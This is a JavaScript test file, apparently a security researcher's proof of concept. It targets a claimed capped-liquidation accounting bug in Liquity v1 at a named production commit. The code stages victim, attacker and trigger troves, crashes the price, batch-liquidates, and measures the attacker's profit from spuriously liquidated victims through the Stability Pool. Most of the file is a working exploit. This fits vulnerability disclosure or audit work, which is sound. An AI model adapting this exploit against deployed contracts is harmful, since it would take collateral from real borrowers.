const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")

const th = testHelpers.TestHelper
const dec = th.dec
const toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  ============================================================================
  PoC — PRODUCTION Liquity v1  (commit 5174ecd0da4842157aba989499200d690b7e374f)

  MAXIMIZACION DEL C-1 (TCR inflado en la liquidacion capped de Recovery Mode).

  GEOMETRIA (precio 200 -> 170 USD/ETH), la del escenario ya validado:
    - VICTIMA   (ICR 1.60 @200): coll 4000 ETH, debt 500 000 LUSD -> ICR@170 = 1.36
    - WHALE     (ICR 1.50 @200): coll 24.75,  debt 3 300 LUSD   -> ICR@170 = 1.275
    - TRIGGER   (ICR 1.50 @200): coll 15,     debt 2 000 LUSD   -> ICR@170 = 1.275
    - ATACANTE  (ICR 1.60 @200): coll 4800,  debt 600 000 LUSD -> ICR@170 = 1.36
    TCR real @170 = 1.359592  =>  la victima (ICR 1.36) NO es liquidable con el TCR REAL.

  El orden de apertura importa: primero las victimas (ICR 1.60) y el atacante, que
  suben el TCR por encima de CCR 1.5; despues whale y trigger (ICR 1.50) que lo bajan
  a 1.5989 -> el margen entre el ICR de la victima (1.36) y el TCR real (1.359592)
  es de ~0.03 pp, suficiente para que la rama capped (MCR <= ICR < TCR) se dispare.

  Bug (C-1): el tracker `entireSystemColl` (batch L722 / secuencial L583) resta solo
  `collToSendToSP`, pero en la rama capped sale del sistema TODO el coll del trove
  (collToSendToSP + collSurplus + collGasCompensation).  El TCR queda inflado, la
  victima (ICR >= TCR real) entra en la rama capped => su ETH se captura al MCR (1.1)
  y el ~9.45 % de su debt va al Stability Pool => al atacante (depositario del SP).

  Este test escala el numero de victimas y mide el PnL real del atacante.
  ============================================================================
*/
contract("PoC Max Scale: Liquity v1 prod 5174ecd capped-liquidation extraction", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin, freddy, george, harry] = accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, lusdToken

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address,
      contracts.stabilityPool.address,
      contracts.borrowerOperations.address
    )
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    lusdToken = contracts.lusdToken
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from, label) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(
      toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    const tcr = await th.getTCR(contracts)
    console.log("  OPEN", (label || from.slice(0, 8)).padEnd(14),
                "coll", t.coll.toString().padStart(22), "debt", t.debt.toString().padStart(20),
                "TCR@200", tcr.toString())
    return { coll: t.coll, debt: t.debt }
  }

  const bal = async (a) => toBN(await web3.eth.getBalance(a))
  const ETH = toBN(dec(1, 18))

  const setup = async (extraVictims) => {
    await priceFeed.setPrice(dec(200, 18))
    await priceFeed.fetchPrice()

    // 1) VICTIMAS (ICR 1.60 @200) — se abren primero para que el TCR quede > CCR
    const victims = []
    victims.push({ addr: carol, ...(await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol, "carol-vict")) })
    for (const v of extraVictims) {
      victims.push({ addr: v, ...(await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), v, "vict-" + v.slice(0, 4))) })
    }
    // 2) ATACANTE (ICR 1.60 @200)
    const dennisT = await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis, "dennis-atk")
    // 3) TROVES DE ICR 1.50 (bajan el TCR) — trigger + whale
    const bobT = await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob, "bob-trigger")
    const aliceT = await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice, "alice-whale")

    // crash
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    const recMode = await th.checkRecoveryMode(contracts)
    return { victims, dennisT, bobT, aliceT, P, realTCR, recMode }
  }

  it("ESCALA: N victimas => PnL del atacante ~9.45% del debt liquidado", async () => {
    const s = await setup([erin, freddy, george])
    console.log("precio", s.P.toString())
    console.log("TCR real", s.realTCR.toString(), "recoveryMode", s.recMode.toString())
    assert.isTrue(s.recMode, "recovery mode")
    for (const v of s.victims) {
      const i = await troveManager.getCurrentICR(v.addr, s.P)
      console.log("  vict", v.addr.slice(0, 8), "ICR", i.toString(), ">=TCR?", i.gte(s.realTCR))
      assert.isTrue(i.gte(s.realTCR), "victim ICR must be >= real TCR")
    }
    const bobICR = await troveManager.getCurrentICR(bob, s.P)
    console.log("  trigger bob ICR", bobICR.toString(), "<TCR?", bobICR.lt(s.realTCR))

    // el atacante deposita en el SP
    const dennisLusd = await lusdToken.balanceOf(dennis)
    await stabilityPool.provideToSP(dennisLusd.sub(toBN(dec(1, 18))), ZERO_ADDRESS, { from: dennis })
    const spDep = await stabilityPool.getTotalLUSDDeposits()
    console.log("SP deposits:", spDep.toString())

    const dennisBefore = await bal(dennis)
    const spEthBefore = toBN(await web3.eth.getBalance(stabilityPool.address))

    const order = [bob, ...s.victims.map(v => v.addr)]
    const tx = await troveManager.batchLiquidateTroves(order, { from: owner })
    for (const log of tx.logs) {
      if (log.event === "TroveLiquidated")
        console.log("LIQ", log.args._borrower.slice(0, 8), "debt", log.args._debt.toString())
    }

    console.log("--- AFTER ---")
    for (const v of s.victims) {
      console.log("  status", v.addr.slice(0, 8), (await troveManager.getTroveStatus(v.addr)).toString(),
                  "surplus", (await collSurplusPool.getCollateral(v.addr)).toString())
    }
    const gain = await stabilityPool.getDepositorETHGain(dennis)
    const spEthAfter = toBN(await web3.eth.getBalance(stabilityPool.address))
    console.log("SP ETH antes/despues:", spEthBefore.toString(), "->", spEthAfter.toString())
    console.log("atacante gain:", gain.toString(), "=", gain.div(ETH).toString(), "ETH")
    console.log("atacante balance delta:", (await bal(dennis)).sub(dennisBefore).toString())
    console.log("SP deposits restantes:", (await stabilityPool.getTotalLUSDDeposits()).toString(), "de", spDep.toString())
    console.log("TCR real final:", (await th.getTCR(contracts)).toString())
    console.log("SP P:", (await stabilityPool.P()).toString(), " scale:", (await stabilityPool.currentScale()).toString())

    let spurious = 0
    for (const v of s.victims) if ((await troveManager.getTroveStatus(v.addr)).toString() === "3") spurious++
    const victimDebt = toBN(dec(500000, 18)).mul(toBN(spurious))
    console.log("victimas liquidadas espuriamente:", spurious, "de", s.victims.length)
    console.log("debt total victimas:", victimDebt.toString())
    console.log("profit como % del debt:", gain.mul(ETH).div(victimDebt).toString())
  })

  it("MAXIMO: el atacante NO puede reclamar el collSurplus de la victima", async () => {
    const s = await setup([])
    await stabilityPool.provideToSP(
      (await lusdToken.balanceOf(dennis)).sub(toBN(dec(1, 18))), ZERO_ADDRESS, { from: dennis })
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    console.log("carol status", (await troveManager.getTroveStatus(carol)).toString())
    console.log("carol surplus", (await collSurplusPool.getCollateral(carol)).toString())
    try {
      await borrowerOperations.claimCollateral({ from: dennis })
      console.log("ATACANTE pudo reclamar el surplus de carol (bug)")
    } catch (e) {
      console.log("atacante NO puede reclamar el surplus:", e.message.slice(0, 140))
    }
    const before = await bal(carol)
    await borrowerOperations.claimCollateral({ from: carol })
    console.log("la victima reclama su surplus:", (await bal(carol)).sub(before).toString(), "wei")
  })
})
